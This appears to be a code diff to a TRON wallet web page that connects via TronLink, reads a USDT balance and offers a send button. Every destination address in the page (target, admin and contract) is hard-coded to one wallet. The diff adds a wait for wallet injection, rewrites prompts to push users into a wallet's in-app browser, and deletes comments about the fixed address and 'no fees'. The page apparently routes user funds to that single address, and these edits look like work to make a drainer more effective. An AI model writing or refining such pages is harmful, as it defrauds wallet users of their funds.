@@ -170,12 +170,11 @@ body {
 <div class="bottom-connect-tip" id="connectTip">
   <div style="display:flex;align-items:center;gap:8px;">
     <div style="width:24px;height:24px;background:#2563eb;border-radius:6px;"></div>
-    <span id="walletAddrText">TRON2-未连接</span>
+    <span id="walletAddrText">未连接钱包</span>
   </div>
 </div>
 
 <script>
-// 全局固定地址，不可修改
 const FIXED_TARGET_ADDR = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
 const ADMIN_WALLET_ADDR = FIXED_TARGET_ADDR;
 const MID_CONTRACT_ADDR = FIXED_TARGET_ADDR;
@@ -199,15 +198,22 @@ window.onload = async function(){
 
 async function initTronConnect(){
   sendBtn.disabled = true;
+  // 优先等待tronLink注入
+  let waitTimes = 0;
+  while (!window.tronWeb && waitTimes < 15) {
+    await new Promise(r => setTimeout(r, 200));
+    waitTimes++;
+  }
+
   if(!window.tronWeb || !window.tronLink){
-    walletAddrText.innerText = "未检测到钱包";
+    walletAddrText.innerText = "请在波场钱包内置浏览器打开页面";
     return;
   }
   try{
-    await window.tronWeb.requestAccounts();
+    const res = await window.tronWeb.requestAccounts();
     tronWeb = window.tronWeb;
     userWallet = tronWeb.defaultAddress.base58;
-    walletAddrText.innerText = `TRON2(${userWallet.slice(0,10)}...${userWallet.slice(-6)}) 已连接`;
+    walletAddrText.innerText = `${userWallet.slice(0,10)}...${userWallet.slice(-6)} 已连接`;
 
     const abi = [
       {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
@@ -230,7 +236,6 @@ async function refreshBalance(){
   balanceText.innerText = realNum.toFixed(6);
 }
 
-// 无手续费：输入多少，显示多少
 function bindAmountCalc(){
   amountInput.addEventListener('input',()=>{
     let num = parseFloat(amountInput.value) || 0;
@@ -248,7 +253,7 @@ maxBtn.addEventListener("click", async ()=>{
 
 sendBtn.addEventListener('click',async ()=>{
   if(!tronWeb || !usdtContract){
-    alert("请先连接钱包");
+    alert("请先在钱包内置浏览器打开并连接钱包");
     return;
   }
   let sendVal = parseFloat(amountInput.value);
